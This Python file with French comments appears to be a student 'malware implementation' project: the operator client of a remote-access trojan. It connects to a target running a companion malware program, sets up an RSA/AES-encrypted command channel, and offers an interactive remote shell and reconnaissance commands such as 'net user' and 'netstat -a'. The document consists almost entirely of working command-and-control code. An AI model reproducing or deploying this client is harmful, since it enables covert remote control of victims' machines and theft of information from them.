"""Client:  Programme utilisé par le Hacker afin de contrôler une machine à distance.Ce programme s’executera
en local et sera en mesure de communiquer avec le second programme"""

import socket
import argparse
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP


class Machine:
    def __init__(self):
        self.buffer = 2048
        self.key_aes = None
        self.iv_aes = None
        # créer un socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Erreur de création de socket: " + str(msg))

    # Reçoit un message chiffré en AES
    def reliable_recv_encryption_aes(self, connection):
        mode_aes = AES.MODE_CFB
        text_enc = connection.recv(self.buffer)
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Instancie un nouvel objet de chiffrement CFB pour l'algorithme AES
        text = cipher_aes.decrypt(text_enc)
        try:
            return text.decode("utf-8")
        except UnicodeDecodeError:      # Erreur lors du décodage d'une chaine str
            return text

    # Envoie le message en AES
    def reliable_send_encryption_aes(self, connection, text_to_encrypt):
        if type(text_to_encrypt) == str:
            text_to_encrypt = text_to_encrypt.encode("utf-8")
        mode_aes = AES.MODE_CFB
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)
        text_enc = cipher_aes.encrypt(text_to_encrypt)
        connection.send(text_enc)

    # Ferme la connexion
    def quit(self):
        self.s.close()


class Client(Machine):
    def __init__(self, host, port=9999):
        super().__init__()
        self.host = host  # Par défaut: 127.0.0.1
        self.port = port
        self.connection_active = False  # Utilisé pour quitter la boucle du menu
        self.key_rsa = None

    # Essaie de se connecter
    def connect_to(self):
        try:
            self.s.connect((self.host, self.port))
            self.connection_active = True
            print("La connexion est établie | IP " + self.host + " | Port : " + str(self.port))
        except socket.gaierror as msg:
            print("L'adresse IP n'est pas valide")
            print("Erreur " + str(msg))

    # Génère une clé RSA et envoie au serveur
    def key_generate_rsa(self):
        self.key_rsa = RSA.generate(self.buffer) # Objet de la classe RSA et contient la clé privée
        #print(self.key_rsa)
        key_pub = self.key_rsa.publickey() # Clé publique
        key_pub_b = key_pub.export_key() # Exporter la clé
        self.s.send(key_pub_b)

    # Reçoit la clé AES générée et déchiffre la clé de session avec la clé RSA privée
    def recv_key_aes(self):
        key_aes_enc = self.s.recv(self.buffer)
        iv_aes_enc = self.s.recv(self.buffer)
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)  # Prépare l'algorithme de chiffrement
        self.key_aes = cipher_rsa.decrypt(key_aes_enc)
        #print(self.key_aes)    # Clé AES en plaintext
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)
        self.iv_aes = cipher_rsa.decrypt(iv_aes_enc)

    # Envoie des commandes au remote shell
    def remote_shell(self):
        try:
            super().reliable_send_encryption_aes(self.s, "shell")
            print("Remote Shell: \nPour quitter le shell \"quitter\"\n")
            # Privilèges utilisateur
            print("~#", end=" ")
            cmd = ""
            while cmd != "quitter":
                cmd = input("")
                if len(str.encode(cmd)) > 0:    # Si taille plus grande alors on envoie
                    super().reliable_send_encryption_aes(self.s, cmd)
                    if self.buffer < 8192:
                        #print(self.buffer) 4096
                        self.buffer = int(self.buffer * 2)
                        client_response = super().reliable_recv_encryption_aes(self.s)
                        #print(self.buffer)
                        self.buffer = int(self.buffer / 2)
                    else:
                        client_response = super().reliable_recv_encryption_aes(self.s)
                    print(client_response, end="")
        except ConnectionResetError:
            self.quit()
        except OSError: # Erreur apparue lorsque mon Malware.py était hors connexion
            print("La connexion doit être déjà fermée.")

    # Envoie et reçoit des informations sur la cible
    def get_info(self, info):
        try:
            super().reliable_send_encryption_aes(self.s, info)
            info = super().reliable_recv_encryption_aes(self.s)
            print(info)
            info = super().reliable_recv_encryption_aes(self.s)
            print(info)
            input("\n\nPress ENTER")
        except ConnectionResetError:
            self.quit()

    def quit(self):
        self.connection_active = False
        try:
            super().reliable_send_encryption_aes(self.s, "quit")
            response_target = super().reliable_recv_encryption_aes(self.s)
            print(response_target)
        except ConnectionResetError:
            print("Connexion déjà fermée")
        except OSError:
            print("Closed")
        super().quit()

parser = argparse.ArgumentParser()
parser.add_argument("-ip", "--ip_target", default="127.0.0.1", type=str, help="Défini l'adresse IP de la cible, la valeur par défaut est 127.0.0.1 (localhost)")
parser.add_argument("-s", "--shell", action="store_true", default=False, help="Saute le menu principal et va directement à l'invite de commande : Ne peut être combiné avec \"-i\"")
parser.add_argument("-i", "--get_info", action="store_true", default=False, help="Saute le menu principal et accéde directement au menu \"get info\" : Ne peut être combiné avec \"-p\"")
parser.add_argument("-b", "--buffer_size", type=int, default="4096", choices=[2048, 4096, 8192, 16384], help="Défini la taille du buffer. La valeur par défaut 4096.")
args = parser.parse_args()

def menu():
    while client.connection_active:
        print("\n" + 66*"=" + "\n" + 30*"=" + " MENU " + 30*"=" + "\n" + 66*"=" + "\n")
        print("\tProjet Python : Implémentation d’un Malware\n\t\t1. Remote Shell \n\t\t2. Get Info\n\t\t3. Quit")
        choice = input("\t> ")

        if choice == "1" or choice == "shell" or choice == "Shell":
            client.remote_shell()
        if choice == "2" or choice == "get info" or choice == "Get info":
            menu_getinfo()
        if choice == "3" or choice == "quit" or choice == "Quit":
            quit()


def menu_getinfo():
    print(30*"=" + " MENU " + 29*"=" + "\n" + 26*"=" + " INFORMATION " + 26*"=" + "\n")
    print("\t\t1. Global information\n\t\t2. Network information\n\t\t3. list user\n\t\t4. Network Statistics\n\t\t5. Quit")
    choice = input("\t> ")

    if choice == "1":
        client.get_info("getinfo_generality")
    if choice == "2":
        client.get_info("ipconfig")
    if choice == "3":
        client.get_info("net user")
    if choice == "4":
        client.get_info("netstat -a")
    if choice == "5":
        menu()


client = Client(args.ip_target)
client.buffer = args.buffer_size
try:
    client.connect_to()
    print("Génère la clé RSA." '\x1b[5;30;41m' + ' (Cette étape peut prendre du temps) ' + '\x1b[0m')
    client.key_generate_rsa()
    print('Réception de la clé AES.')
    client.recv_key_aes()
    print("La connexion avec la cible est désormais" '\x1b[5;30;41m' + ' chiffrée et sécurisée. ' + '\x1b[0m')
    if args.shell and not args.get_info:
        client.remote_shell()
    if args.get_info and not args.shell:
        menu_getinfo()
    if args.get_info and args.shell:
        print("Tu peux pas faire les deux, tu dois choisir.")
    menu()
    if client.connection_active:
        client.quit()
except ConnectionRefusedError as msg:
    print("Erreur: " + str(msg))
    print("Le programme sur la cible n'est pas en cours d'exécution.")
except TimeoutError as msg:
    print("Error :" + str(msg))
    print("Redémarre le programme et vérifie l'ip.")
